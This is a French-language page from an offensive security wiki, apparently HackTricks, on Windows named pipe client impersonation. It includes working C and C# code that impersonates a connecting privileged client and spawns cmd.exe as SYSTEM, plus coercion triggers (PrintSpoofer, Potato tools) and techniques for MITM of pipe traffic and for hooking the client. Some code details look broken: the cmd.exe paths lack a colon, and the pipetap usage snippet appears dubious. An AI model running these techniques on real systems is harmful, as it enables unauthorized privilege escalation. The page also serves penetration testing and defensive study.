# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation est une primitive de local privilege escalation qui permet à un thread de serveur named-pipe d’adopter le contexte de sécurité d’un client qui se connecte à lui. En pratique, un attaquant qui peut exécuter du code avec SeImpersonatePrivilege peut contraindre un client privilégié (par ex. un service SYSTEM) à se connecter à un pipe contrôlé par l’attaquant, appeler ImpersonateNamedPipeClient, dupliquer le token obtenu en token primaire, puis lancer un processus en tant que client (souvent NT AUTHORITY\SYSTEM).

Cette page se concentre sur la technique de base. Pour des exploit chains de bout en bout qui forcent SYSTEM à se connecter à votre pipe, voir les pages de la famille Potato référencées ci-dessous.

## TL;DR
- Créez un named pipe : \\.\pipe\<random> et attendez une connexion.
- Faites en sorte qu’un composant privilégié s’y connecte (spooler/DCOM/EFSRPC/etc.).
- Lisez au moins un message depuis le pipe, puis appelez ImpersonateNamedPipeClient.
- Ouvrez le token d’impersonation du thread courant, DuplicateTokenEx(TokenPrimary), et CreateProcessWithTokenW/CreateProcessAsUser pour obtenir un processus SYSTEM.

## Requirements and key APIs
- Privilèges généralement nécessaires pour le processus/thread appelant :
- SeImpersonatePrivilege pour réussir à impersoner un client qui se connecte et pour utiliser CreateProcessWithTokenW.
- Sinon, après avoir impersoné SYSTEM, vous pouvez utiliser CreateProcessAsUser, ce qui peut nécessiter SeAssignPrimaryTokenPrivilege et SeIncreaseQuotaPrivilege (ces privilèges sont satisfaits lorsque vous impersonate SYSTEM).
- API principales utilisées :
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (il faut lire au moins un message avant l’impersonation)
- ImpersonateNamedPipeClient et RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ou CreateProcessAsUser
- Niveau d’impersonation : pour effectuer des actions utiles localement, le client doit autoriser SecurityImpersonation (par défaut pour de nombreux clients RPC/named-pipe locaux). Les clients peuvent réduire cela avec SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION lors de l’ouverture du pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- Si ImpersonateNamedPipeClient renvoie ERROR_CANNOT_IMPERSONATE (1368), assurez-vous de lire d’abord depuis le pipe et que le client n’a pas restreint l’impersonation au niveau Identification.
- Préférez DuplicateTokenEx avec SecurityImpersonation et TokenPrimary pour créer un token primaire adapté à la création de processus.

## .NET quick example
En .NET, NamedPipeServerStream peut impersonate via RunAsClient. Une fois l’impersonation en cours, dupliquez le thread token et créez un processus.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Déclencheurs/coercions courants pour amener SYSTEM vers votre pipe
Ces techniques contraignent des services privilégiés à se connecter à votre named pipe afin que vous puissiez les impersonate :
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Voir l’utilisation détaillée et la compatibilité ici :

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Si vous avez juste besoin d’un exemple complet de création du pipe et d’impersonation pour lancer SYSTEM depuis un déclencheur de service, voir :

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Abus d’IPC Named Pipe & MITM (ACLs, First-Instance Races, Client Hooking)

Quand un service privilégié et un processus low-privileged communiquent via `\\.\pipe\...`, traitez le pipe comme n’importe quelle autre frontière IPC non fiable. Au-delà de l’impersonation classique côté serveur, des ACL de pipe faibles, des flags de création dangereux et des décisions de confiance côté client peuvent tous devenir des primitives de local privilege escalation.

### Énumérez d’abord les pipes candidats
- Lister rapidement les pipes depuis PowerShell : `Get-ChildItem \\.\pipe\`
- `pipelist64.exe` de Sysinternals est utile pour repérer le nombre d’instances et les pipes à instance unique.
- Priorisez les noms utilisés par des services exécutés en tant que `SYSTEM`, en particulier les helpers, updaters, launchers et UI brokers.

### MITM via des DACL permissives et des instances de pipe supplémentaires
- Tout processus capable de parler à un serveur privilégié peut déjà fuzz son protocole et rechercher des verbes privilégiés.
- Le cas le plus intéressant est lorsque la DACL accorde `FILE_GENERIC_WRITE`/`GENERIC_WRITE` sur l’objet pipe. Sur les named pipes, cela inclut implicitement `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` partage le même bit), donc un attaquant peut créer une autre instance serveur avec le même nom.
- Comme les instances sont appariées en ordre FIFO, les instances créées par l’attaquant et les instances légitimes peuvent s’entrelacer : créez une instance rogue avec `CreateNamedPipe`, puis ouvrez le même nom de pipe avec `CreateFile`, et attendez qu’un vrai client tombe sur l’instance serveur rogue.
- Résultat : observer, modifier, relay, ou désynchroniser l’IPC privilégié sans avoir à posséder le processus serveur d’origine.

### First-instance race sur les descripteurs de sécurité du pipe
- `lpSecurityAttributes` définit la DACL uniquement lors de la création de la première instance d’un nom de pipe.
- Si un service privilégié démarre tard et n’utilise pas `FILE_FLAG_FIRST_PIPE_INSTANCE`, un attaquant peut pré-créer le nom du pipe avec une DACL permissive, puis laisser le service créer plus tard des instances sous le contexte de sécurité choisi par l’attaquant.
- Cela transforme le démarrage du service en race condition : gagnez la première instance, puis connectez ou MITM les clients plus tard en utilisant l’ACL affaiblie.
- Mitigation pour les défenseurs, et point de vérification clé pour les attaquants : vérifiez si `CreateNamedPipe(..., dwOpenMode, ...)` inclut `FILE_FLAG_FIRST_PIPE_INSTANCE`. Sinon, testez la pré-création avant le démarrage du service.

### Les vérifications PID/signature sont du hardening, pas une frontière
- Certains produits essaient de restreindre l’accès en vérifiant `GetNamedPipeClientProcessId`, le chemin de l’image du processus, ou le signer Authenticode du client connecté.
- Cela ne sert qu’à limiter le risque jusqu’à ce que vous injectiez dans le client légitime : une fois à l’intérieur du processus de confiance, vous héritez exactement du contexte PID/image/signature attendu par le serveur.
- Pour les applications desktop séparées, instrumenter le processus UI/helper low-privileged est souvent plus simple qu’attaquer directement le service `SYSTEM`.

### Hookez le client selon son modèle d’I/O
- I/O synchrone : interceptez `NtWriteFile` avant que le syscall consomme le buffer, et inspectez/patch `NtReadFile` après son retour.
- I/O overlapped : stockez le `OVERLAPPED`/`IoStatusBlock` vu dans `NtReadFile`, puis inspectez le buffer après `GetOverlappedResult` ou une fois l’attente pertinente terminée.
- Completion ports : `GetQueuedCompletionStatus` atteint `NtRemoveIoCompletion`; l’`ApcContext` renvoyé se relie à nouveau au `OVERLAPPED` utilisé par la lecture originale, ce qui est le bon pivot pour retrouver le buffer désormais rempli.
- Completion routines (`ReadFileEx`) : le callback de completion est délivré comme une APC. Si vous voulez altérer les données retournées ou injecter des réponses synthétiques, hookez la vraie completion routine et, pour une injection personnalisée, utilisez un dispatcher `QueueUserAPC` à un seul argument qui reconstruit les 3 arguments attendus de la routine.

### Notes sur les outils
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) proxifie le trafic named-pipe via une DLL helper injectée et expose un workflow type Burp pour l’édition/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) adopte une approche basée sur Frida et se concentre sur le hooking de `NtReadFile`/`NtWriteFile` ainsi que sur les pivots async/completion ci-dessus, puis transfère le trafic vers un workflow d’édition basé sur WebSocket.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Considérations opérationnelles
- Les named pipes ont une faible latence ; de longues pauses pendant l’édition des buffers peuvent bloquer des services fragiles.
- Les clients pilotés par Overlapped/completion-port/APC nécessitent des hooks différents de simples détours `ReadFile`/`WriteFile`.
- L’injection dans le client de confiance est bruyante et doit généralement être réservée au développement d’exploit, au reversing de protocole ou au fuzzing local en lab.

## Dépannage et pièges
- Vous devez lire au moins un message depuis le pipe avant d’appeler `ImpersonateNamedPipeClient`; sinon vous obtiendrez `ERROR_CANNOT_IMPERSONATE` (1368).
- Si le client se connecte avec `SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION`, le serveur ne peut pas impersonate complètement ; vérifiez le niveau d’impersonation du token via `GetTokenInformation(TokenImpersonationLevel)`.
- `CreateProcessWithTokenW` nécessite `SeImpersonatePrivilege` pour l’appelant. Si cela échoue avec `ERROR_PRIVILEGE_NOT_HELD` (1314), utilisez `CreateProcessAsUser` après avoir déjà impersonated `SYSTEM`.
- Assurez-vous que le descripteur de sécurité de votre pipe autorise le service cible à se connecter si vous le durcissez ; par défaut, les pipes sous `\\.\pipe` sont accessibles selon la DACL du serveur.

## Références
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
